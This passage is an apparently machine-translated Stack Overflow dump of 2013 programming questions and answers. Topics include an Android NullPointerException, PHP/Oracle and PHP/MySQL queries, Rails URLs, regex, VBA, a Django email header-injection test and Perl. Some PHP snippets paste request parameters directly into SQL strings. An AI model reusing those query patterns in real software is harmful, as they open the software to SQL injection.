        actionBar.setDisplayHomeAsUpEnabled(true);
    }

    @Override
    protected void onDestroy() {
        super.onPause();
        dba.close();
        cursor.close();
    }

    @Override
    protected void onResume() {
        super.onResume();

        // Setting up the database adapter
        dba = new dbAdapter(this);
        dba.open();

        // Getting the Cursor of the requested data
        cursor = dba.read("sermons", null, null);
        adapter = new SimpleCursorAdapter(this, R.layout.sermon_list, cursor,
                FROM, TO, 0);
        adapter.setViewBinder(this);
        setListAdapter(adapter);
        setTitle(R.string.title_activity_sermon);
    }

    /*
     * To dynamically change the time of day displayed as well as adding the
     * title and file tags to the play buttons
     */
    @Override
    public boolean setViewValue(View view, Cursor cursor, int columnIndex) {

        // To set the sermon time
        if (view.getId() == R.id.sermon_time) {
            String time = cursor.getString(cursor.getColumnIndex("hour"));

            if (time.contains("AM")) {
                ((TextView) view).setText("Sunday AM");
            } else if (time.contains("PM")) {
                ((TextView) view).setText("Sunday PM");
            }

            // Adding tags for the title and file name to the "Play audio/video"
            // buttons
            ***TextView playAudio = (TextView) findViewById(R.id.sermon_audio);***   //This is the line that throws the NullPointerException
            playAudio.setTag(R.string.file_tag,
                    cursor.getString(cursor.getColumnIndex("file")));
            playAudio.setTag(R.string.title_tag,
                    cursor.getString(cursor.getColumnIndex("title")));

            TextView playVideo = (TextView) findViewById(R.id.sermon_video);
            playVideo.setTag(R.string.file_tag,
                    cursor.getString(cursor.getColumnIndex("file")));
            playVideo.setTag(R.string.title_tag,
                    cursor.getString(cursor.getColumnIndex("title")));

            return true;
        }

        else {
            return false;
        }
    }

    @Override
    public void onClick(View view) {
        int id = view.getId();

        // Starting WebActivity with needed data values
        if (id == R.id.sermon_audio || id == R.id.sermon_video) {

            Intent intent = new Intent(this, WebActivity.class);
            intent.putExtra("file", (String) view.getTag(R.string.file_tag));
            intent.putExtra("title", (String) view.getTag(R.string.title_tag));

            String type = null;

            if (id == R.id.sermon_audio) {
                type = "audio";
            } else if (id == R.id.sermon_video) {
                type = "video";
            }

            intent.putExtra("type", type);
            startActivity(intent);
        }
    }
} 
```

**讲道列表.xml**

```
<?xml version="1.0" encoding="utf-8"?>
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="wrap_content"
    android:layout_height="match_parent"
    android:clickable="false"
    android:longClickable="false"
    android:orientation="vertical" >

    <ImageView
        android:id="@+id/sermon_thumbnail"
        style="@style/Thumbnail"
        android:src="@drawable/sermon" />

    <TextView
        android:id="@+id/sermon_audio"
        style="@style/FeedBody"
        android:layout_alignParentLeft="true"
        android:layout_below="@+id/sermon_speaker"
        android:layout_marginTop="15dp"
        android:clickable="true"
        android:onClick="onClick"
        android:paddingLeft="25dp"
        android:text="Play audio"
        android:textColor="@color/link" />

    <TextView
        android:id="@+id/sermon_video"
        style="@style/FeedBody"
        android:layout_alignBaseline="@+id/sermon_audio"
        android:layout_alignBottom="@+id/sermon_audio"
        android:layout_alignParentRight="true"
        android:clickable="true"
        android:onClick="onClick"
        android:paddingRight="25dp"
        android:text="Play video"
        android:textColor="@color/link" />

        <TextView
            android:id="@+id/sermon_title"
            style="@style/FeedTitle"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:layout_toRightOf="@id/sermon_thumbnail"
            android:lines="2"
            android:scrollHorizontally="false"
            android:singleLine="false"
            android:width="0dip" />

    <TextView
        android:id="@+id/sermon_scripture"
        style="@style/FeedBody"
        android:layout_alignParentLeft="true"
        android:layout_below="@+id/sermon_thumbnail"
        android:paddingLeft="3dp"
        android:text="Scripture" />

    <TextView
        android:id="@+id/sermon_speaker"
        style="@style/FeedBody"
        android:layout_alignParentLeft="true"
        android:layout_below="@+id/sermon_scripture"
        android:paddingLeft="3dp"
        android:text="Speaker" />

    <TextView
        android:id="@+id/sermon_time"
        style="@style/FeedBody"
        android:layout_alignBaseline="@+id/sermon_speaker"
        android:layout_alignBottom="@+id/sermon_speaker"
        android:layout_alignParentRight="true"
        android:paddingRight="3dp"
        android:paddingTop="5dp"
        android:text="Time" />

    <TextView
        android:id="@+id/sermon_date"
        style="@style/FeedBody"
        android:layout_alignBaseline="@+id/sermon_scripture"
        android:layout_alignBottom="@+id/sermon_scripture"
        android:layout_alignParentRight="true"
        android:paddingRight="3dp"
        android:text="Date" />

</RelativeLayout> 
```

**堆栈跟踪**

```
 03-19 17:17:45.942: W/ActivityThread(21858): Application com.lakesidebaptist.lakesidelife is waiting for the debugger on port 8100...
03-19 17:17:45.958: I/System.out(21858): Sending WAIT chunk
03-19 17:17:45.965: I/dalvikvm(21858): Debugger is active
03-19 17:17:46.161: I/System.out(21858): Debugger has connected
03-19 17:17:46.161: I/System.out(21858): waiting for debugger to settle...
03-19 17:17:46.364: I/System.out(21858): waiting for debugger to settle...
03-19 17:17:46.559: I/System.out(21858): waiting for debugger to settle...
03-19 17:17:46.762: I/System.out(21858): waiting for debugger to settle...
03-19 17:17:46.965: I/System.out(21858): waiting for debugger to settle...
03-19 17:17:47.161: I/System.out(21858): waiting for debugger to settle...
03-19 17:17:47.364: I/System.out(21858): debugger has settled (1300)
03-19 17:17:47.794: D/dalvikvm(21858): GC_CONCURRENT freed 186K, 3% free 10996K/11271K, paused 13ms+12ms, total 37ms
03-19 17:17:47.981: D/libEGL(21858): loaded /vendor/lib/egl/libEGL_POWERVR_SGX540_120.so
03-19 17:17:47.981: D/libEGL(21858): loaded /vendor/lib/egl/libGLESv1_CM_POWERVR_SGX540_120.so
03-19 17:17:47.981: D/libEGL(21858): loaded /vendor/lib/egl/libGLESv2_POWERVR_SGX540_120.so
03-19 17:17:48.036: D/OpenGLRenderer(21858): Enabling debug mode 0
03-19 17:17:51.848: D/dalvikvm(21858): GC_CONCURRENT freed 230K, 3% free 11206K/11527K, paused 14ms+13ms, total 54ms
03-19 17:17:51.903: I/none(21858): SELECT * FROM 'sermons';
03-19 17:17:51.903: I/none(21858): 20
03-19 17:17:55.731: D/dalvikvm(21858): Debugger has detached; object registry had 995 entries
03-19 17:17:55.731: D/AndroidRuntime(21858): Shutting down VM
03-19 17:17:55.731: W/dalvikvm(21858): threadid=1: thread exiting with uncaught exception (group=0x4182e300)
03-19 17:17:55.747: E/AndroidRuntime(21858): FATAL EXCEPTION: main
03-19 17:17:55.747: E/AndroidRuntime(21858): java.lang.NullPointerException
03-19 17:17:55.747: E/AndroidRuntime(21858):    at com.lakesidebaptist.lakesidelife.ui.Content.SermonActivity.setViewValue(SermonActivity.java:90)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.support.v4.widget.SimpleCursorAdapter.bindView(SimpleCursorAdapter.java:131)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.support.v4.widget.CursorAdapter.getView(CursorAdapter.java:256)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.AbsListView.obtainView(AbsListView.java:2267)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.ListView.makeAndAddView(ListView.java:1769)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.ListView.fillDown(ListView.java:672)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.ListView.fillFromTop(ListView.java:733)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.ListView.layoutChildren(ListView.java:1622)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.AbsListView.onLayout(AbsListView.java:2102)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.View.layout(View.java:13754)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewGroup.layout(ViewGroup.java:4362)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.RelativeLayout.onLayout(RelativeLayout.java:948)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.View.layout(View.java:13754)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewGroup.layout(ViewGroup.java:4362)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.FrameLayout.onLayout(FrameLayout.java:448)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.View.layout(View.java:13754)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewGroup.layout(ViewGroup.java:4362)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.LinearLayout.setChildFrame(LinearLayout.java:1649)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.LinearLayout.layoutVertical(LinearLayout.java:1507)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.LinearLayout.onLayout(LinearLayout.java:1420)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.View.layout(View.java:13754)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewGroup.layout(ViewGroup.java:4362)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.widget.FrameLayout.onLayout(FrameLayout.java:448)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.View.layout(View.java:13754)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewGroup.layout(ViewGroup.java:4362)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewRootImpl.performLayout(ViewRootImpl.java:1866)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1687)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:998)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:4212)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.Choreographer$CallbackRecord.run(Choreographer.java:725)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.Choreographer.doCallbacks(Choreographer.java:555)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.Choreographer.doFrame(Choreographer.java:525)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:711)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.os.Handler.handleCallback(Handler.java:615)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.os.Handler.dispatchMessage(Handler.java:92)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.os.Looper.loop(Looper.java:137)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at android.app.ActivityThread.main(ActivityThread.java:4745)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at java.lang.reflect.Method.invokeNative(Native Method)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at java.lang.reflect.Method.invoke(Method.java:511)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:786)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:553)
03-19 17:17:55.747: E/AndroidRuntime(21858):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-19T21:46:13.300

尝试使用该方法提供的视图并找到该视图，如下所示：

```
TextView playAudio = (TextView) view.findViewById(R.id.sermon_audio); 
```

**编辑：**

您可能需要先找到父视图，然后在其上使用 findViewById，尝试如下操作：

```
RelativeLayout parent = (RelativeLayout)view.getParent();
TextView playAudio = (TextView) parent.findViewById(R.id.sermon_audio); 
```

# php - 在 php 中使用 oracle 序列时出错

> ID：15510952
> 
> 赞同：0
> 
> 时间：2013-03-19T21:38:08.487
> 
> 标签：php, oracle, oracle11g

每次我运行以下 PHP 代码时，我都会得到输出

**预订确认！祝贺。您的预订 ID 是：6**

成功预订。

bookingid 是一个序列，然后我从插入的值中获取该预订 id 以获取序列的当前值。所以我不知道我做错了什么。

```
 <html><body>
   <?php
       $con = oci_connect("system", "password", "localhost/XE");
          if (!$con) {
            $m = oci_error();
        exit('Connect Error ' . $m['message']);
        }
        $thid = $_GET["hid"];
        $trno = $_GET["rno"];
        $tgid = $_GET["gid"];
        $sd = $_GET["sdate"];
        $ed = $_GET["edate"];
        $dchange = "ALTER SESSION SET NLS_DATE_FORMAT= 'YYYY-MM-DD'";
        $stid1 = oci_parse($con,$dchange);
        oci_execute($stid1);
        $c1 = "SELECT * FROM B WHERE HOTELID = '$thid' AND ROOMNO = '$trno' AND ((STARTDATE < '$sd' AND ENDDATE > '$sd') or (STARTDATE < '$ed' AND ENDDATE > '$ed') or (STARTDATE >= '$sd' AND ENDDATE <= '$ed'))";
        $c2 = oci_parse($con, $c1);
        oci_execute($c2);
        $row = oci_fetch_row($c2);
        if(!$row)
        {
        $temp =  "INSERT INTO B VALUES(bno.nextval,'$thid','$trno','$tgid','$sd','$ed')";
        $stid = oci_parse($con,$temp);
        oci_execute($stid);
         oci_free_statement($stid);
        //$c7 = "SELECT bookid FROM B WHERE HOTELID = '$thid' AND ROOMNO = '$trno' AND GUEStID = '$tgid' AND STARTDATE = '$sd' AND ENDDATE = '$ed'";
        //printf("<h3>Booking Confirmed! Congatulation. </h3>") ;
        **$c8 = oci_parse($con, "SELECT MAX(BOOKID) FROM B");
        oci_execute($c8);
        printf("<h3>Booking Confirmed! Congratulation. Your Booking Id is: %u</h3>", $c8);**
        }
        else
            printf("<h3>Booking already exist. </br>Please try with another search.</h3>");

        ?>
</n> <form action="index.php"><input type="submit" value="BACK" />
    </form>

</BODY> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T22:05:12.353

给你一些建议。

1.  您应该在 SQL 语句中使用[绑定变量](http://php.net/manual/en/mysqli-stmt.bind-param.php)而不是拼接文字（除非您希望在填满共享池时降低数据库的性能）。

2.  `SELECT MAX(BOOKID) FROM B`是获取预订 ID 的错误且不安全的方式。好像 2 个会话并行进行了预订，您可能会得到错误的结果（如果表中的最大 id 高于当前序列值，您也会得到错误的结果）。而是做`select bno.currval from dual`或使用[返回子句](http://docs.oracle.com/cd/B19306_01/appdev.102/b14261/returninginto_clause.htm)作为插入的一部分（假设 PHP 使用它）

3.  在您的插入中，您应该指定列名以获得良好的做法。即做`INSERT INTO B (BOOKID, HOTELID, ROOMNO, STARTDATE, ENDDATE) VALUES(bno.nextval....`

# java - 用于 Java 7 UberJar 的 Maven 阴影插件

> ID：15510953
> 
> 赞同：0
> 
> 时间：2013-03-19T21:38:08.533
> 
> 标签：java, maven, maven-plugin, java-7, maven-shade-plugin

我的问题很简单：是否有与 Java 版本 7 兼容的 Maven-shade-plugin 版本？具体来说，当我尝试使用此插件时，我收到以下错误（使用 Netbeans IDE）：

```
diamond operator is not supported in -source 1.5
  (use -source 7 or higher to enable diamond operator) 
```

当我尝试编译时，我收到此警告：

```
error: multi-catch statement is not supported in -source 1.5 
```

所以看来我只需要一个与 Java 7 兼容的插件。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:59:01.537

这可能不是插件的问题，maven 默认使用 1.5，这并不意味着插件不适用于 1.6 或 1.7，也许你只需要为正确的 java 版本配置它。有关示例，请参见：[https ://stackoverflow.com/a/9927172/1042999。](https://stackoverflow.com/a/9927172/1042999)

# ruby-on-rails - URL 辅助方法使用什么默认 :id？

> ID：15510955
> 
> 赞同：1
> 
> 时间：2013-03-19T21:38:15.293
> 
> 标签：ruby-on-rails

我是 Rails 新手，对 link_to 方法有疑问。第二个参数应该是链接的 url，可以使用 url 辅助方法生成。但是，可能需要将 :id 作为辅助方法的参数传递，这可以通过传递一个对象（该对象具有 :id 作为其属性之一）来完成。

好吧，在一种情况下，我没有将对象传递给方法（在一个视图中）。但是，该 url 仍然能够获得正确的 :id（可能使用之前定义的实例变量）。

当我什至没有传入任何对象时，Rails 是如何为 :id 选择值的？

非常感谢！

* * *

编辑

以下是相关代码：

```
link_to 'Find Movies With Same Director', same_dir_path 
```

在这里，我在一个带有 url 的“显示”页面上`/movies/1`。`same_dir_path`是 URL 的辅助方法，其中`/movies/same_dir/:id`将`:id`是传递对象的辅助方法，并且`movie#same_dir`是`controller#action`. 请注意，我没有将任何对象传递给辅助方法`link_to`，但它`:id`从前一个 url（在本例中为“1”）获取。该 URL 甚至与前一个 URL 无关（路径不同）。

* * *

这是控制器方法（same_dir）：

```
def same_dir    
  @movies = Movie.find(params[:id])

  if (@movies.director.nil? || @movies.director == '')

    flash.keep  
    redirect_to movies_path         
    flash[:warning]="'#{@movies.title}' has no director info"                 
    return

  end   

  @otherMovies = Movie.find_all_by_director(@movies.director)   

end 
```

这是 routes.rb 代码：

```
match 'movies/same_dir/:id'=> 'movies#same_dir', :as => :same_dir
resources :movies 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-19T22:17:34.513

阅读您更新的问题后，我可以为您提供更好的答案：

Rails 控制器可以通过该`url_options`方法具有默认的 url 选项。（似乎不是一个非常有记录的功能。（[here](http://api.rubyonrails.org/classes/ActionView/Helpers/UrlHelper.html#method-i-url_options)和[here](http://apidock.com/rails/ActionController/Base/url_for)））

默认情况下，此方法从**当前请求**返回参数，这就是 id 的来源。

你也可以覆盖它：

```
def url_options
  { my_parameter: my_value }.merge(super)
end 
```

* * *

*原始答案（可能仍然有用）*：

您所看到的很可能是浏览器功能。例如这段代码：

```
link_to "Show", "" 
```

生成此 HTML 代码：

```
<a href="">Show</a> 
```

如果您在浏览器中单击该链接，它会导航到**相对于当前 url 的空 url**，这实际上等于当前 url。

另一个例子：

```
link_to "Publish", :publish 
```

生成：

```
<a href="publish">Publish</a> 
```

现在，如果您当前的 url 是`http://localhost/articles/1/edit`该链接将带您到`http://localhost/articles/1/publish`. （请注意，最终 url 包含模型 ID，即使 HTML 源代码中没有它）

在这两种情况下，浏览器都会保留您当前的模型 ID，因为您使用的是相对 url。

这种行为可能会给您一种神奇的模型 ID 检测**错觉**，尤其是因为浏览器在将鼠标悬停在链接上时会预览最终（=绝对）url。

看看源代码，我敢打赌您生成的链接不包含任何模型 ID。

# google-app-engine - 用于 apache 骆驼路由的 appengine 或 aws

> ID：15510959
> 
> 赞同：1
> 
> 时间：2013-03-19T21:38:28.627
> 
> 标签：google-app-engine, amazon-web-services, routing, apache-camel, amazon-elastic-beanstalk

这里的第一个问题，所以请放轻松。

生产者和端点可以是 sockets/websockets/http(s)。然后将处理这些请求并将其发送给订阅的消费者或发送到队列并根据消息优先级和/或用户技能进行路由。我还想存储所有消息和事务，并可以选择重试和安排它们。

我知道 appengine 现在不支持套接字，但是从 sdk 1.7.5 开始，它对受信任的测试人员可用，因此将来可能会起作用。此应用程序不会为客户端页面提供服务，因此通道 api 将无法工作，并且我没有看到任何 websocket 服务器支持，我想我可以解决这个问题。

另一方面，如果我使用 ec2，那么所有这些问题都会消失，但我需要自己扩展应用程序，并且我必须管理数据库。我知道 AWS 有其他选项，例如 SQS、SNS、Beanstalk 和 simpleDB，可以处理队列、通知和扩展。

我想使用 appengine，因为它似乎是更容易开发的平台。我知道我不是第一个尝试构建这样的东西的人，所以我想了解你的经历。

骆驼与 appengine 配合得好吗？我知道很多骆驼组件使用在 appengine 上不起作用的线程、jms、jndi，如果没有这些，你是否仍然成功地在 appengine 上使用骆驼。根据我对我希望应用程序执行的操作的描述，是否可以在 appengine 上使用，或者我是否更适合使用 ec2。也有人尝试过使用 AWS beanstalk 执行此操作。

我花了相当多的时间在谷歌上搜索，但找不到任何具体的东西。我在 appengine 上运行了示例骆驼应用程序，所以我知道骆驼可以工作，只是想确保我谈到的其他功能也可以。我是骆驼的新手，如果答案已经很明显或者问题含糊不清，我很抱歉，感谢任何帮助。

感谢您在这里的任何见解！

# php - 无法弄清楚这么简单的正则表达式

> ID：15510962
> 
> 赞同：1
> 
> 时间：2013-03-19T21:38:33.237
> 
> 标签：php, regex

我正在尝试验证通过 PHP 中的 POST 方法处理的表单。传递的一些示例值是姓名、年龄、性别、性格类型等。

为了确定给出的用户数据是否正确，我使用了正则表达式。

例如，这是我要工作的一些..名称（只要它不为空，就可以了：

`if (strlen($name) == 0)` 这个对我有用。另一种有效的是性格类型，它必须是荣格性格测试中的类型（例如 ISTP、ENTP、INFP 等）。我的代码是： `if (!preg_match("/[IE]{1}[NS]{1}[FT]{1}[JP]{1}/", $per))`其中 $per 是用户提交的 Jung 人格类型。这个也很好用。

我遇到的困难是年龄。它必须是 0-99，所以是 1 或 2 位数字。我觉得它应该如此简单，但无论出于何种原因，它都不起作用。这是我尝试过的正则表达式：

`/\d{1,2}/`

`/[0-9]{1,2}/`

`/(\d|\d\d)/`

`/([0-9]|[0-9][0-9])/`

我不明白为什么这些都不起作用，所有四个似乎都完全符合标准。也许我不明白如何正确使用正则表达式，但我花了最后几个小时仔细阅读示例，所以我很有信心它应该是正确的。

任何帮助将不胜感激，谢谢:)

编辑：如果这有帮助，将值“abcdefg”或“ab”作为 $age 值传递出来作为错误（这是正确的）。但是，传递“100”、“333”或“99999”的值会在匹配时出现（这是错误的，或者不是我想要的）。希望这有助于解释更多~

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-03-19T21:46:34.007

如前所述，正则表达式不是正确的答案。但是如果你必须使用正则表达式，你需要开始`^`和结束`$`锚点。正则表达式匹配字符串的一部分，所以`/\d{1,2}/`匹配`abc123`是因为它至少有一个数字和一个可选的第二个数字。如果您希望它仅匹配 2 个字符，则需要将匹配锚定到字符串的开头和结尾，`/^\d{1,2}$/`例如“字符串开头，一位或两位数字，字符串结尾”。

# excel - 单击 Excel 中 VBA 框架内的按钮的事件

> ID：15510967
> 
> 赞同：3
> 
> 时间：2013-03-19T21:38:50.070
> 
> 标签：excel, events, vba, activex, frame

在 Excel 中，我将 ActiveX 框架插入到工作表中。右键单击此框架允许我选择：

框架对象>编辑

现在我可以在这个框架中添加一个按钮。伟大的。

如何向此按钮添加 _Click 事件以使其运行宏？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-20T00:35:06.287

基本上，您需要做的是创建自己的类，例如“XButton”。在这个“XButton”内部，将有一个用于框架内按钮对象的事件处理程序。

因此，您可以处理“btn”发送的所有事件并进一步转发。然后你必须创建一个自定义接口（空类）IXButtonEventHandler，它看起来像这样：

```
Option Explicit

Public Sub Click(Sender as XButton)

End Sub 
```

因此，您的自定义类**XButton**将如下所示：

```
Private WithEvents btn as MSForms.CommandButton
Private mEventHandler as IXButtonEventHandler

Public Sub CreateObject(EventHandlerOf as MSForms.CommandButton, EventHandler as IXButtonEventHandler)
     Set btn = EventHandlerOf
     Set mEventHandler = EventHandler
End Sub

Private Sub btn_Click()
    If not mEventHandler is Nothing then mEventHandler.Click(Me)
End Sub 
```

假设您的 Workbook 将是事件处理程序，并且需要实现 IXButtonEventHandler 接口，例如：

```
Implements IXButtonEventHandler

Private Sub IXButtonEventHandler_Click(Sender as XButton)
    'your code
End Sub 
```

在 Workbook_Load 或诸如此类的情况下，您需要创建 XButton 集合并将它们附加到您的框架控件：

```
Dim xbtn as Collection

Private Sub AttachButtons()
    Set xbtn = New Collection

    Dim i as Long

    For i = 0 to 3
       Dim xb as New XButton
       xb.CreateObject <YourFrame>.Controls("CommandButton" & Cstr(i)), Me

       xbtn.Add xb
    Next i
End Sub 
```

# django - 为什么这个 Django 测试通过了？

> ID：15510969
> 
> 赞同：3
> 
> 时间：2013-03-19T21:38:56.577
> 
> 标签：django, unit-testing

单独调用 send_mail 函数会由于主题中的换行而导致 BadHeaderError 异常。

我希望这个 test_newline_causes_exception 也会失败，但事实并非如此。这是在 Django 1.3 中。有任何想法吗？

```
from django.core.mail import send_mail
from django.utils import unittest

class EmailTestCase(unittest.TestCase):

    def test_newline_causes_exception(self):
        send_mail('Header\nInjection', 'Here is the message.', 'from@example.com',
                  ['to@example.com'], fail_silently=False) 
```

**编辑：**这个新测试表明，在测试中使用 send_mail 时，不会调用标头检查代码 (django.core.mail.message.forbid_multi_line_headers)。

```
from django.core.mail import send_mail, BadHeaderError, outbox
from django.utils import unittest

class EmailTestCase(unittest.TestCase):

    def test_newline_in_subject_should_raise_exception(self):

        try:
            send_mail('Subject\nhere', 'Here is the message.',
                      'from@example.com', ['to@example.com'], fail_silently=False)
        except BadHeaderError:
            raise Exception

        self.assertEqual(len(outbox), 1)

        self.assertEqual(outbox[0].subject, 'Subject here') 
```

结果：

```
AssertionError: 'Subject\nhere' != 'Subject here' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-19T22:10:26.960

你并没有真正测试任何东西。测试意味着检查是否`BadHeaderError`已经提出。如果断言测试为假，则测试将失败。你可以做这样的事情 -

```
def test_newline_causes_exception(self)
    error_occured = False
    try:
        send_mail('Header\nInjection', 'Here is the message.', 'from@example.com',
                  ['to@example.com'], fail_silently=False)
    except BadHeaderError:
        error_occured = True

    self.assertTrue(error_ocurred) 
```

我没有测试过。但它应该工作。

PS：`from django.core.mail import send_mail, BadHeaderError`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-20T01:50:32.013

我发现这个问题已经在 Django 1.5 中得到修复。测试电子邮件后端 (locmem.py) 现在执行与标准后端相同的标头清理。

[https://code.djangoproject.com/ticket/18861](https://code.djangoproject.com/ticket/18861)

[https://github.com/django/django/commit/8599f64e54adfb32ee6550ed7a6ec9944034d978](https://github.com/django/django/commit/8599f64e54adfb32ee6550ed7a6ec9944034d978)

**编辑**

我找到了一种在 Django 版本 <1.5 中测试标头验证的解决方法。

使用 get_connection 方法加载控制台后端，该后端执行与生产后端相同的验证。

感谢 Alexander Afanasiev 为我指明了正确的方向。

```
connection = get_connection('django.core.mail.backends.console.EmailBackend')
send_mail('Subject\nhere',
          'Here is the message.',
          'from@example.com',
          ['to@example.com'],
          fail_silently=False,
          connection=connection) 
```

# perl - perl 解析命令行参数

> ID：15510974
> 
> 赞同：0
> 
> 时间：2013-03-19T21:39:05.733
> 
> 标签：perl

我有一个网络，我想为所有 IP 地址分配一个名称。为此，我想制作一个 perl 脚本，它将每个 ip 打印在与 ip 范围不同的行上。我通过 Net:IP 找到了一种方法，但我不知道如何将我的命令行 ip 范围解析为脚本（我是 perl 新手）。我的脚本如下所示：

```
#!/usr/local/bin/perl
use Net::IP;
my $test=join(' ',@ARGV);
my $ip = new Net::IP ('$test') || die;
do {
    print $ip->ip(), "\n";
} while (++$ip);

exit; 
```

所以我唯一的问题是命令行语法看起来像这样：perl ip.pl 192.168.10.1 - 192.168.10.255 我无法弄清楚如何在 Net:IP 之后将这个参数解析到我的脚本中（'这里'）。

谢谢你的每一个想法。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-19T21:47:15.203

改变

```
my $ip = new Net::IP ('$test') || die; 
```

至

```
my $ip = new Net::IP ($test) || die; 
```

单引号不会评估您的标量。

还有，总是

```
use strict;
use warnings; 
```

# php - 如何显示表格中的所有值

> ID：15510977
> 
> 赞同：0
> 
> 时间：2013-03-19T21:39:10.960
> 
> 标签：php, mysql, arrays, fetch

我在下面的代码中遇到了就业表的问题。我希望该表显示他们已插入表中的所有作业。相反，它只显示最新的。显示这些的值是 $ee（开始和结束日期的 $start 和 $end）。再一次的问题是它不显示所有的工作只是最后一个。有谁知道如何解决这个问题？与数组有关吗？提前致谢

```
 $employment_table = "no table";
  $sql = "SELECT * FROM history WHERE userID='$profile_id' AND type='job'";
  $query = mysqli_query($db_conx, $sql) or die(mysqli_error($db_conx));

   while ($row = mysqli_fetch_array($query, MYSQLI_ASSOC)) {
     $h_id = $row["id"];
     $ee = $row["ee"];
     $htype = $row["type"];
     $unixstart = $row["start"];
     $unixend = $row["end"];
       $start = date("d/m/Y",$unixstart);
       $end =  date("d/m/Y",$unixend);
  $employment_table = "<table>";
  $employment_table .= "<tr>";
  $employment_table .= "<th>Company Name</td>";
  $employment_table .= " <th>Start Date</td>";
  $employment_table .= "<th>End Date</td>";
  $employment_table .= "</tr>";
  $employment_table .= "<tr>";
  $employment_table .= "<td>".$ee."</td>";
  $employment_table .= "<td>".$start."</td>";
  $employment_table .= "<td>".$end."</td>";
  $employment_table .= "</tr>";
  $employment_table .= "</table>";      
 } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-19T21:44:41.910

`$employment_table`每次迭代都会覆盖。您还为每一行创建一个新表。

因此，请执行以下操作：

```
$employment_table = "<table>";
while ($row = mysqli_fetch_array($query, MYSQLI_ASSOC)) {
    $h_id = $row["id"];
    $ee = $row["ee"];
    $htype = $row["type"];
    $unixstart = $row["start"];
    $unixend = $row["end"];
    $start = date("d/m/Y",$unixstart);
    $end =  date("d/m/Y",$unixend);
    $employment_table .= "<tr>";
    $employment_table .= "<th>Company Name</td>";
    $employment_table .= " <th>Start Date</td>";
    $employment_table .= "<th>End Date</td>";
    $employment_table .= "</tr>";
    $employment_table .= "<tr>";
    $employment_table .= "<td>".$ee."</td>";
    $employment_table .= "<td>".$start."</td>";
    $employment_table .= "<td>".$end."</td>";
    $employment_table .= "</tr>";
}
$employment_table .= "</table>"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-19T21:44:14.563

`$employment_table`您每次都在循环中覆盖变量。将`<table>`and`</table>`标签从循环中取出 - 例如

```
 $employment_table = "<table>";
    while ($row = mysqli_fetch_array($query, MYSQLI_ASSOC)) {
         $h_id = $row["id"];
         $ee = $row["ee"];
         $htype = $row["type"];
         $unixstart = $row["start"];
         $unixend = $row["end"];
           $start = date("d/m/Y",$unixstart);
           $end =  date("d/m/Y",$unixend);

      $employment_table .= "<tr>";
      $employment_table .= "<th>Company Name</td>";
      $employment_table .= " <th>Start Date</td>";
      $employment_table .= "<th>End Date</td>";
      $employment_table .= "</tr>";
      $employment_table .= "<tr>";
      $employment_table .= "<td>".$ee."</td>";
      $employment_table .= "<td>".$start."</td>";
      $employment_table .= "<td>".$end."</td>";
      $employment_table .= "</tr>";

     }
